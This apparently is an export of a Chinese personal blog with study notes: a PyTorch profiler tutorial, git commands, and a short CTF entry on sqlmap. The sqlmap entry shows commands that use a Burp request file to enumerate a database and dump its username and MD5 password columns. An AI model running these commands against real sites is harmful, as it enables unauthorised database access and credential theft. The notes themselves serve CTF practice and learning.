<li>GNN能够在节点和边上执行信息传递，考虑了图数据的拓扑结构。</li>
<li>GNN用于图分类、节点分类、链接预测等任务，并在推荐系统和生物信息学中也有广泛应用。</li>
</ul>
</li>
</ol>
<h2 id="基本成员"><a href="#基本成员" class="headerlink" title="基本成员"></a>基本成员</h2><h3 id="Tensor"><a href="#Tensor" class="headerlink" title="Tensor"></a>Tensor</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.cuda()</span><br></pre></td></tr></table></figure>



<h3 id="Module-Model"><a href="#Module-Model" class="headerlink" title="Module(Model)"></a>Module(Model)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.cuda()</span><br></pre></td></tr></table></figure>



<h2 id="基本方法"><a href="#基本方法" class="headerlink" title="基本方法"></a>基本方法</h2><h3 id="randn"><a href="#randn" class="headerlink" title="randn"></a>randn</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">torch.randn(5, 3, 224, 224) -&gt; tensor</span><br></pre></td></tr></table></figure>



<h2 id="预设模型"><a href="#预设模型" class="headerlink" title="预设模型"></a>预设模型</h2><h3 id="torchvision-models"><a href="#torchvision-models" class="headerlink" title="torchvision.models"></a>torchvision.models</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resnet18()</span><br><span class="line">AlexNet: 一种深度卷积神经网络，用于图像分类。它是深度学习的里程碑之一，拥有多层卷积和池化层。</span><br><span class="line"></span><br><span class="line">VGG: 基于卷积神经网络的一系列模型，包括 VGG11、VGG16 和 VGG19，用于图像分类。它们都具有深度卷积结构。</span><br><span class="line"></span><br><span class="line">ResNet: 残差网络是一种非常深的卷积神经网络，通过引入残差块，克服了深度神经网络的退化问题。包括 ResNet18、ResNet50 等不同深度的模型。</span><br><span class="line"></span><br><span class="line">DenseNet: 密集连接网络，将每一层的特征图与前面所有层的特征图连接，从而实现了更好的信息传递。</span><br><span class="line"></span><br><span class="line">Inception (GoogLeNet): Inception 模型是一种具有多个分支的网络，用于同时提取不同尺度和类型的特征。</span><br><span class="line"></span><br><span class="line">MobileNet: 非常轻量级的卷积神经网络，适用于移动设备和嵌入式系统。</span><br><span class="line"></span><br><span class="line">ResNeXt: ResNeXt 模型是一种卷积神经网络，引入了组卷积的概念，以提高模型的性能。</span><br><span class="line"></span><br><span class="line">ShuffleNet: 一种具有轻量级网络结构的模型，适用于资源受限的环境。</span><br><span class="line"></span><br><span class="line">SqueezeNet: 另一个轻量级神经网络模型，具有较少的参数和计算量。</span><br><span class="line"></span><br><span class="line">Wide ResNet: 基于 ResNet 的变种，拥有更宽的网络结构，以提高性能。</span><br><span class="line"></span><br><span class="line">InceptionResNetV2: 结合了 Inception 和 ResNet 的特点，具有较高的性能。</span><br><span class="line"></span><br><span class="line">MNASNet: 一种轻量级的神经网络，适用于移动设备和嵌入式系统。</span><br></pre></td></tr></table></figure>





<h2 id="Profiler"><a href="#Profiler" class="headerlink" title="Profiler"></a>Profiler</h2><blockquote>
<p>参考文档：<a href="https://pytorch.org/tutorials/recipes/recipes/profiler_recipe.html">PyTorch Profiler — PyTorch Tutorials 2.1.0+cu121 documentation</a></p>
</blockquote>
<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>pytorch profiler通过上下文管理器开启，可以接收很多设置参数，比如：</p>
<ul>
<li><code>activities</code> - 分析活动的列表<ul>
<li><code>ProfilerActivity.CPU</code> - Pytorch操作符，TorchScript函数，和用户定义的代码标签（见下面的<code>record_function</code>）</li>
<li><code>ProfileActivity.CUDA</code> - 设备上的CUDA内核</li>
</ul>
</li>
<li><code>record_shapes</code> - 是否记录每次操作的输入的形状</li>
<li><code>profile_memory</code> -  是否报告模型张量消耗的内存量</li>
<li><code>use_cuda</code> - 是否测量CUDA内核的执行时间</li>
</ul>
<p>注意：当使用CUDA时，profiler还会展示主机上发生的运行时CUDA事件。</p>
<h3 id="导入库"><a href="#导入库" class="headerlink" title="导入库"></a>导入库</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torchvision.models <span class="keyword">as</span> models</span><br><span class="line"><span class="keyword">from</span> torch.profiler <span class="keyword">import</span> profile, record_function, ProfilerActivity</span><br></pre></td></tr></table></figure>

<h3 id="实例化一个简单的Resnet模型"><a href="#实例化一个简单的Resnet模型" class="headerlink" title="实例化一个简单的Resnet模型"></a>实例化一个简单的Resnet模型</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model = models.resnet18() <span class="comment"># 在CPU上</span></span><br><span class="line">inputs = torch.randn(<span class="number">5</span>, <span class="number">3</span>, <span class="number">224</span>, <span class="number">224</span>)</span><br></pre></td></tr></table></figure>

<h3 id="使用profiler分析执行时间"><a href="#使用profiler分析执行时间" class="headerlink" title="使用profiler分析执行时间"></a>使用profiler分析执行时间</h3><h4 id="only-CPU"><a href="#only-CPU" class="headerlink" title="only CPU"></a>only CPU</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> profile(activities=[ProfilerActivity.CPU], record_shapes=<span class="literal">True</span>) <span class="keyword">as</span> prof:</span><br><span class="line">	<span class="keyword">with</span> record_function(<span class="string">&quot;model_inference&quot;</span>):</span><br><span class="line">        model(inputs)</span><br></pre></td></tr></table></figure>

<p>从上面我们可以看到，我们可以通过<code>record_function</code>上下文管理器，使用用户提供的名字来标记任意代码范围（在上面的例子中，<code>model_inference</code>被用作标签)。</p>
<p>在执行被上下文管理器包装的代码范围期间，profiler允许检查哪些操作符被调用了。如果多个profiler范围同时处于活动(active)状态（例如，在并行的pytorch线程中），则每个profiling上下文管理器仅跟踪其相应范围的运算。</p>
<p>Profiler还会自动评测使用<code>torch.jit_fork</code>启动的异步任务，以及（在向后传递的情况下）用<code>backward()</code>调用启动的向后传递运算符。</p>
<p>下面打印以上执行的数据：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(prof.key_averages())</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(prof.key_averages().table(sort_by=<span class="string">&quot;cpu_time_total&quot;</span>, row_limit=<span class="number">10</span>))</span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---------------------------------  ------------  ------------  ------------  ------------  ------------  ------------  </span><br><span class="line">                             Name    Self CPU %      Self CPU   CPU total %     CPU total  CPU time avg    # of Calls</span><br><span class="line">---------------------------------  ------------  ------------  ------------  ------------  ------------  ------------</span><br><span class="line">                  model_inference         2.88%       4.048ms       100.00%     140.643ms     140.643ms             1</span><br><span class="line">                     aten::conv2d         0.10%     140.000us        65.89%      92.664ms       4.633ms            20</span><br><span class="line">                aten::convolution         0.34%     485.000us        65.79%      92.524ms       4.626ms            20</span><br><span class="line">               aten::_convolution         0.18%     255.000us        65.44%      92.039ms       4.602ms            20</span><br><span class="line">         aten::mkldnn_convolution        64.72%      91.030ms        65.26%      91.784ms       4.589ms            20</span><br><span class="line">                 aten::max_pool2d         0.03%      36.000us        14.84%      20.866ms      20.866ms             1</span><br><span class="line">    aten::max_pool2d_with_indices        14.81%      20.830ms        14.81%      20.830ms      20.830ms             1</span><br><span class="line">                 aten::batch_norm         0.20%     277.000us        12.02%      16.899ms     844.950us            20</span><br><span class="line">     aten::_batch_norm_impl_index         0.17%     234.000us        11.95%      16.813ms     840.650us            20</span><br><span class="line">          aten::native_batch_norm        11.59%      16.301ms        11.77%      16.551ms     827.550us            20</span><br><span class="line">---------------------------------  ------------  ------------  ------------  ------------  ------------  ------------</span><br><span class="line">Self CPU time total: 140.643ms</span><br></pre></td></tr></table></figure>

<p>可以看到，<code>aten::mkldnn_convolution</code>函数的<code>Self CPU</code>最高。</p>
<p>其中 Self CPU 和 CPU 的区别在于，前者减去了子操作的执行时间，后者保留了子操作的执行时间。</p>
<p>可以在<code>table()</code>中使用<code>sort_by=&quot;self_cpu_time_total</code>“，根据 self cpu 时间对输出进行排序。</p>
<p>为了获得<strong>更细粒度</strong>的输出，包含操作输入的形状，可以使用<code>group_by_input_shape</code>(要求运行profiler时开启<code>record_shapes=True</code>)：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(prof.key_averages(group_by_input_shape=<span class="literal">True</span>)).table(sort_by=<span class="string">&quot;self_cpu_time_total&quot;</span>, row_limit=<span class="number">10</span>)</span><br></pre></td></tr></table></figure>

<p>输出如下（省略了一些列）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---------------------------------  ------------  ------------ ... ----------------------------------------------------------  </span><br><span class="line">                             Name    Self CPU %      Self CPU ...                                               Input Shapes  </span><br><span class="line">---------------------------------  ------------  ------------ ... ----------------------------------------------------------  </span><br><span class="line">         aten::mkldnn_convolution        19.26%      22.064ms ...      [[5, 64, 56, 56], [64, 64, 3, 3], [], [], [], [], []]  </span><br><span class="line">    aten::max_pool2d_with_indices        15.51%      17.759ms ...                    [[5, 64, 112, 112], [], [], [], [], []]  </span><br><span class="line">         aten::mkldnn_convolution        10.50%      12.026ms ...     [[5, 512, 7, 7], [512, 512, 3, 3], [], [], [], [], []]  </span><br><span class="line">         aten::mkldnn_convolution        10.10%      11.566ms ...   [[5, 256, 14, 14], [256, 256, 3, 3], [], [], [], [], []]  </span><br><span class="line">         aten::mkldnn_convolution         6.59%       7.553ms ...   [[5, 128, 28, 28], [128, 128, 3, 3], [], [], [], [], []]  </span><br><span class="line">         aten::mkldnn_convolution         6.49%       7.428ms ...      [[5, 3, 224, 224], [64, 3, 7, 7], [], [], [], [], []]  </span><br><span class="line">          aten::native_batch_norm         3.30%       3.777ms ... [[5, 128, 28, 28], [128], [128], [128], [128], [], [], []]  </span><br><span class="line">         aten::mkldnn_convolution         3.20%       3.660ms ...   [[5, 256, 14, 14], [512, 256, 3, 3], [], [], [], [], []]  </span><br><span class="line">                  model_inference         3.16%       3.616ms ...                                                         []  </span><br><span class="line">         aten::mkldnn_convolution         3.10%       3.552ms ...   [[5, 128, 28, 28], [256, 128, 3, 3], [], [], [], [], []]  </span><br><span class="line">---------------------------------  ------------  ------------ ... ----------------------------------------------------------  </span><br><span class="line">Self CPU time total: 114.529ms</span><br></pre></td></tr></table></figure>

<h4 id="with-GPU"><a href="#with-GPU" class="headerlink" title="with GPU"></a>with GPU</h4><p>profiler也可以用来分析在GPU上执行的模型的性能：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model = models.resnet18().cuda()</span><br><span class="line">inputs = torch.randn(<span class="number">5</span>, <span class="number">3</span>, <span class="number">224</span>, <span class="number">224</span>).cuda()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> profile(activities=[ProfilerActivity.CPU, ProfilerActivity.CUDA], record_shapes=<span class="literal">True</span>) <span class="keyword">as</span> prof:</span><br><span class="line">	<span class="keyword">with</span> record_function(<span class="string">&quot;model_inference&quot;</span>):</span><br><span class="line">		model(inputs)</span><br><span class="line"><span class="built_in">print</span>(prof.key_averages().table(sort_by=<span class="string">&quot;cuda_time_total&quot;</span>, row_limit=<span class="number">10</span>))</span><br></pre></td></tr></table></figure>

<p>输出如下（省略了一些行）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">----------------------------  ----------  --------- ----------  -----------  ----------  ------------  ----------</span><br><span class="line">                        Name  Self CPU %   Self CPU  Self CUDA  Self CUDA %  CUDA total  CUDA time avg # of Calls</span><br><span class="line">----------------------------  ----------  --------- ----------  -----------  ----------  ------------  ----------</span><br><span class="line">             model_inference       0.79%    3.720ms  258.000us        0.07%   346.300ms     346.300ms           1</span><br><span class="line">                aten::conv2d       0.03%  151.000us  102.000us        0.03%   289.635ms      14.482ms          20</span><br><span class="line">           aten::convolution       0.09%  418.000us   98.000us        0.03%   289.533ms      14.477ms          20</span><br><span class="line">          aten::_convolution       0.07%  332.000us   98.000us        0.03%   289.435ms      14.472ms          20</span><br><span class="line">     aten::cudnn_convolution      87.95%  412.414ms  289.337ms       83.55%   289.337ms      14.467ms          20</span><br><span class="line">                  aten::add_       2.19%   10.283ms   32.463ms        9.37%    32.463ms       1.159ms          28</span><br><span class="line">            aten::batch_norm       0.02%  111.000us   91.000us        0.03%    10.973ms     548.650us          20</span><br><span class="line">aten::_batch_norm_impl_index       0.04%  207.000us   99.000us        0.03%    10.882ms     544.100us          20</span><br><span class="line">      aten::cudnn_batch_norm       4.35%   20.415ms   10.402ms        3.00%    10.783ms     539.150us          20</span><br><span class="line">            aten::max_pool2d       0.01%   32.000us    4.000us        0.00%     4.379ms       4.379ms           1</span><br><span class="line">----------------------------  ----------  --------- ----------  -----------  ----------  ------------  ----------</span><br><span class="line">Self CPU time total: 468.945ms</span><br><span class="line">Self CUDA time total: 346.300ms</span><br></pre></td></tr></table></figure>

<p>注：第一次使用cuda profiling会引入<strong>额外的开销</strong>，导致运行时间较长，之后就相对正常了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Self CPU time total: 192.059ms</span><br><span class="line">Self CUDA time total: 155.963ms</span><br></pre></td></tr></table></figure>

<h3 id="使用profiler分析内存开销"><a href="#使用profiler分析内存开销" class="headerlink" title="使用profiler分析内存开销"></a>使用profiler分析内存开销</h3><p>profiler能够统计模型运行过程中tensor使用获释放的内存数量，<code>profile_memory=True</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torchvision.models <span class="keyword">as</span> models</span><br><span class="line"><span class="keyword">from</span> torch.profiler <span class="keyword">import</span> profile, record_function, ProfilerActivity</span><br><span class="line"></span><br><span class="line">model = models.resnet18()</span><br><span class="line">inputs = torch.randn(<span class="number">5</span>, <span class="number">3</span>, <span class="number">224</span>, <span class="number">224</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> profile(activities=[ProfilerActivity.CPU], record_shapes=<span class="literal">True</span>, profile_memory=<span class="literal">True</span>) <span class="keyword">as</span> prof:</span><br><span class="line">    <span class="keyword">with</span> record_function(<span class="string">&quot;model_inference&quot;</span>):</span><br><span class="line">        model(inputs)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(prof.key_averages().table(sort_by=<span class="string">&quot;self_cpu_memory_usage&quot;</span>, row_limit=<span class="number">10</span>))</span><br><span class="line"><span class="comment"># (omitting some columns)</span></span><br><span class="line"><span class="comment"># ---------------------------------  ------------  ------------ ------------  ------------  ------------  </span></span><br><span class="line"><span class="comment">#                              Name    Self CPU %      Self CPU      CPU Mem  Self CPU Mem    # of Calls</span></span><br><span class="line"><span class="comment"># ---------------------------------  ------------  ------------ ------------  ------------  ------------</span></span><br><span class="line"><span class="comment">#                       aten::empty         0.31%     403.000us     94.35 Mb      94.35 Mb           200</span></span><br><span class="line"><span class="comment">#     aten::max_pool2d_with_indices        18.90%      24.260ms     11.48 Mb      11.48 Mb             1</span></span><br><span class="line"><span class="comment">#                  aten::empty_like         0.05%      60.000us     47.37 Mb     490.00 Kb            20</span></span><br><span class="line"><span class="comment">#                       aten::addmm         0.24%     302.000us     19.53 Kb      19.53 Kb             1</span></span><br><span class="line"><span class="comment">#                        aten::mean         0.05%      61.000us     10.00 Kb      10.00 Kb             1</span></span><br><span class="line"><span class="comment">#               aten::empty_strided         0.01%       7.000us          4 b           4 b             1</span></span><br><span class="line"><span class="comment">#                      aten::conv2d         0.13%     173.000us     47.37 Mb           0 b            20</span></span><br><span class="line"><span class="comment">#                 aten::convolution         0.29%     375.000us     47.37 Mb           0 b            20</span></span><br><span class="line"><span class="comment">#                aten::_convolution         0.17%     224.000us     47.37 Mb           0 b            20</span></span><br><span class="line"><span class="comment">#          aten::mkldnn_convolution        60.82%      78.050ms     47.37 Mb           0 b            20</span></span><br><span class="line"><span class="comment"># ---------------------------------  ------------  ------------ ------------  ------------  ------------</span></span><br><span class="line"><span class="comment"># Self CPU time total: 128.330ms</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(prof.key_averages().table(sort_by=<span class="string">&quot;cpu_memory_usage&quot;</span>, row_limit=<span class="number">10</span>))</span><br><span class="line"><span class="comment"># (omitting some columns)</span></span><br><span class="line"><span class="comment"># ---------------------------------  ------------  ------------ ------------  ------------  ------------  </span></span><br><span class="line"><span class="comment">#                              Name    Self CPU %      Self CPU      CPU Mem  Self CPU Mem    # of Calls</span></span><br><span class="line"><span class="comment"># ---------------------------------  ------------  ------------ ------------  ------------  ------------</span></span><br><span class="line"><span class="comment">#                       aten::empty         0.31%     403.000us     94.35 Mb      94.35 Mb           200</span></span><br><span class="line"><span class="comment">#                  aten::batch_norm         1.19%       1.528ms     47.41 Mb           0 b            20</span></span><br><span class="line"><span class="comment">#      aten::_batch_norm_impl_index         0.21%     272.000us     47.41 Mb           0 b            20</span></span><br><span class="line"><span class="comment">#           aten::native_batch_norm        10.43%      13.379ms     47.41 Mb     -47.00 Kb            20</span></span><br><span class="line"><span class="comment">#                      aten::conv2d         0.13%     173.000us     47.37 Mb           0 b            20</span></span><br><span class="line"><span class="comment">#                 aten::convolution         0.29%     375.000us     47.37 Mb           0 b            20</span></span><br><span class="line"><span class="comment">#                aten::_convolution         0.17%     224.000us     47.37 Mb           0 b            20</span></span><br><span class="line"><span class="comment">#          aten::mkldnn_convolution        60.82%      78.050ms     47.37 Mb           0 b            20</span></span><br><span class="line"><span class="comment">#                  aten::empty_like         0.05%      60.000us     47.37 Mb     490.00 Kb            20</span></span><br><span class="line"><span class="comment">#                  aten::max_pool2d         0.02%      20.000us     11.48 Mb           0 b             1</span></span><br><span class="line"><span class="comment"># ---------------------------------  ------------  ------------ ------------  ------------  ------------</span></span><br><span class="line"><span class="comment"># Self CPU time total: 128.330ms</span></span><br></pre></td></tr></table></figure>

<h3 id="使用跟踪功能"><a href="#使用跟踪功能" class="headerlink" title="使用跟踪功能"></a>使用跟踪功能</h3><p>通过<code>export_chrome_trace</code>，profiler的分析结果能够输出为一个<code>.json</code>（跟踪）文件。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model = models.resnet18().cuda()</span><br><span class="line">inputs = torch.randn(<span class="number">5</span>, <span class="number">3</span>, <span class="number">224</span>, <span class="number">224</span>).cuda()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> profile(activities=[ProfilerActivity.CPU, ProfilerActivity.CUDA]) <span class="keyword">as</span> prof:</span><br><span class="line">    model(inputs)</span><br><span class="line"></span><br><span class="line">prof.export_chrome_trace(<span class="string">&quot;trace.json&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>在浏览中访问<code>chrome//tracing</code>或<code>edge://tracing</code>，加载生成的<code>trace.json</code>文件，界面如下：</p>
<p><img src="/../../pic/Learning-Python/pytorch/edge-tracing.png" alt="edge-tracing"></p>
<h3 id="检查栈跟踪"><a href="#检查栈跟踪" class="headerlink" title="检查栈跟踪"></a>检查栈跟踪</h3><p>Profiler能够被用来分析Python和TorchScript的栈跟踪：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> profile(</span><br><span class="line">    activities=[ProfilerActivity.CPU, ProfilerActivity.CUDA],</span><br><span class="line">    with_stack=<span class="literal">True</span></span><br><span class="line">) <span class="keyword">as</span> prof:</span><br><span class="line">    model(inputs)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(prof.key_averages(group_by_stack_n=<span class="number">5</span>).table(sort_by=<span class="string">&quot;self_cuda_time_total&quot;</span>, row_limit=<span class="number">2</span>))</span><br></pre></td></tr></table></figure>

<p>【测试失败!】（未输出堆栈信息）</p>
<h3 id="将数据可视化为火焰图"><a href="#将数据可视化为火焰图" class="headerlink" title="将数据可视化为火焰图"></a>将数据可视化为火焰图</h3><p>执行时间（<code>self_cpu_time_total</code>和<code>self_cuda_time_total</code>）和栈跟踪能够被可视化为一个火焰图。</p>
<p>首先使用<code>export_stacks</code>导出原始数据（需要<code>with_stack=True</code>）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prof.export_stacks(<span class="string">&quot;./profiler_stacks.txt&quot;</span>, <span class="string">&quot;self_cuda_time_total&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>【测试失败!】（生成的文件为空）</p>
<p>推荐使用 <a href="https://github.com/brendangregg/FlameGraph">Flamegraph tool</a> 生成一个可交互的<code>.svg</code>文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/brendangregg/FlameGraph</span><br><span class="line">cd FlameGraph</span><br><span class="line">./flamegraph.pl --title &quot;CUDA time&quot; --countname &quot;us.&quot; /tmp/profiler_stacks.txt &gt; perf_viz.svg</span><br></pre></td></tr></table></figure>



<h3 id="使用profiler分析长时间运行的工作"><a href="#使用profiler分析长时间运行的工作" class="headerlink" title="使用profiler分析长时间运行的工作"></a>使用profiler分析长时间运行的工作</h3><p>Pytorch profiler提供一个额外的API用于处理长时间运行的工作（如训练循环）。如果跟踪所有的执行，会很慢，生成的跟踪文件也会很大。为了避免这样，可以使用以下可选参数：</p>
<ul>
<li><code>schedule</code> - 指定一个以整数参数(步长)为输入的函数，如 <code>torch.profiler.schedule</code>帮助函数，生成一个shcedule。</li>
<li><code>on-trace-ready</code> -  指定一个以profiler引用为输入的回调函数，每次当新跟踪准备好时，去调用该函数</li>
</ul>
<p>首先考虑以下示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.profiler <span class="keyword">import</span> schedule</span><br><span class="line"></span><br><span class="line">my_schedule = schedule(</span><br><span class="line">    skip_first=<span class="number">10</span>,	<span class="comment"># 跳过前10步</span></span><br><span class="line">    wait=<span class="number">5</span>,			<span class="comment"># 每轮前5步空转等待</span></span><br><span class="line">    warmup=<span class="number">1</span>,		<span class="comment"># 1步热身，测量但不记录，丢掉刚开始测量时由于额外开销导致的不准确的数据</span></span><br><span class="line">    active=<span class="number">3</span>,		<span class="comment"># 3步活动，测量并记录</span></span><br><span class="line">    repeat=<span class="number">2</span>)		<span class="comment"># 可选参数，最多两轮</span></span><br></pre></td></tr></table></figure>

<p>下面是更完整的示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">trace_handler</span>(<span class="params">p</span>):</span><br><span class="line">    output = p.key_averages().table(sort_by=<span class="string">&quot;self_cuda_time_total&quot;</span>, row_limit=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span>(output)</span><br><span class="line">    p.export_chrome_trace(<span class="string">&quot;./trace_&quot;</span> + <span class="built_in">str</span>(p.step_num) + <span class="string">&quot;.json&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">with</span> profile(</span><br><span class="line">	activities=[ProfilerActivity.CPU, ProfilerActivity],</span><br><span class="line">    schedule=torch.profiler.schedule(</span><br><span class="line">    	wait=<span class="number">1</span>,</span><br><span class="line">    	warmup=<span class="number">2</span>,</span><br><span class="line">    	active=<span class="number">2</span>),</span><br><span class="line">    on_trace_ready=trace_handler</span><br><span class="line">) <span class="keyword">as</span> p:</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        model(inputs)</span><br><span class="line">        p.step()	<span class="comment"># 告诉profiler，到下一步了。增加p.step_num计数</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Learning-Python</category>
      </categories>
  </entry>
  <entry>
    <title>sqlmap</title>
    <url>/2023/11/06/CTF-Tricks/sqlmap/</url>
    <content><![CDATA[<p>sqlmap使用笔记。</p>
<p>官网：<a href="https://sqlmap.org/">sqlmap: automatic SQL injection and database takeover tool</a></p>
<span id="more"></span>

<h2 id="结合burpsuit"><a href="#结合burpsuit" class="headerlink" title="结合burpsuit"></a>结合burpsuit</h2><p>先使用burpsuit抓包，将请求包内容存入文件，如“burp.log”</p>
<h2 id="智能模式"><a href="#智能模式" class="headerlink" title="智能模式"></a>智能模式</h2><p>-l 后跟burp请求包文件，–batch 表示使用默认操作，-smart开启智能模式</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -l burp.log --batch -smart</span><br></pre></td></tr></table></figure>

<h3 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -l burp.log --batch -smart --dbs</span><br></pre></td></tr></table></figure>

<p>输出（例）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">available databases [2]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] Inject_sql</span><br></pre></td></tr></table></figure>

<h3 id="查看数据库里的表"><a href="#查看数据库里的表" class="headerlink" title="查看数据库里的表"></a>查看数据库里的表</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -l burp.log --batch -smart -D Inject_sql --tables </span><br></pre></td></tr></table></figure>

<p>输出（例）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: Inject_sql</span><br><span class="line">[1 table]</span><br><span class="line">+------+</span><br><span class="line">| auth |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure>

<h3 id="查看数据库表里的列"><a href="#查看数据库表里的列" class="headerlink" title="查看数据库表里的列"></a>查看数据库表里的列</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -l burp.log --batch -smart -D Inject_sql -T auth --columns </span><br></pre></td></tr></table></figure>

<p>输出（例）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: Inject_sql</span><br><span class="line">Table: auth</span><br><span class="line">[2 columns]</span><br><span class="line">+----------+--------------+</span><br><span class="line">| Column   | Type         |</span><br><span class="line">+----------+--------------+</span><br><span class="line">| password | varchar(255) |</span><br><span class="line">| username | varchar(255) |</span><br><span class="line">+----------+--------------+</span><br></pre></td></tr></table></figure>

<h3 id="查看数据库表列里的值"><a href="#查看数据库表列里的值" class="headerlink" title="查看数据库表列里的值"></a>查看数据库表列里的值</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -l burp.log --batch -smart -D Inject_sql -T auth -C password --dump </span><br></pre></td></tr></table></figure>

<p>输出（例）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----------------------------------+</span><br><span class="line">| password                         |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| 098f6bcd4621d373cade4e832627b4f6 |</span><br><span class="line">| 202cb962ac59075b964b07152d234b70 |</span><br><span class="line">| 4aeed0301e36d0e7d405739646ef8ae6 |</span><br><span class="line">| 4e7bdb88640b376ac6646b8f1ecfb558 |</span><br><span class="line">| 72b938f302b9db9b214d9c779c975634 |</span><br><span class="line">| 96e98952b440e8d0361c552fb0e67bc6 |</span><br><span class="line">| e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -l burp.log --batch -smart -D Inject_sql -T auth -C username --dump </span><br></pre></td></tr></table></figure>

<p>输出（例）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: Inject_sql</span><br><span class="line">Table: auth</span><br><span class="line">[7 entries]</span><br><span class="line">+----------+</span><br><span class="line">| username |</span><br><span class="line">+----------+</span><br><span class="line">| 123      |</span><br><span class="line">| admin    |</span><br><span class="line">| lisi     |</span><br><span class="line">| testuser |</span><br><span class="line">| wangwu   |</span><br><span class="line">| zhangsan |</span><br><span class="line">| zhaoliu  |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure>

<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p><strong>对表dump</strong>：也可以直接对表进行dump</p>
<p><strong>选择注入类型</strong>： 使用 <code>--technique</code> 选项可以指定使用的注入技术，如：<code>--technique=U</code> （联合查询注入，有具体的payload）或 <code>--technique=B</code> （盲注，没有确定的payload）等</p>
]]></content>
      <categories>
        <category>CTF-Tricks</category>
      </categories>
  </entry>
  <entry>
    <title>Learning-git</title>
    <url>/2023/11/06/else/Learning-git/</url>
    <content><![CDATA[<p>git学习笔记。</p>
<span id="more"></span>

<h2 id="克隆"><a href="#克隆" class="headerlink" title="克隆"></a>克隆</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone &lt;URL&gt; &lt;local_repo_name&gt;(可选)</span><br></pre></td></tr></table></figure>

<h2 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h2><p>产看本地分支</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch</span><br></pre></td></tr></table></figure>

<p>删除本地分支</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch -d &lt;branch_name&gt;</span><br></pre></td></tr></table></figure>

<p>新建本地分支并推送到远程</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git checkout -b &lt;branch_name&gt;</span><br><span class="line">git push --set-upstream origin &lt;branch_name&gt;</span><br></pre></td></tr></table></figure>

<p>切换分支（切换之后，本地文件目录会变为该分支的内容）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git checkout &lt;branch_name&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>else</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Memory Mountain</title>
    <url>/2023/11/04/else/Memory-Mountain/</url>
    <content><![CDATA[<p>Memory-Mountain实验。</p>
<p>参考资料：</p>
<ul>
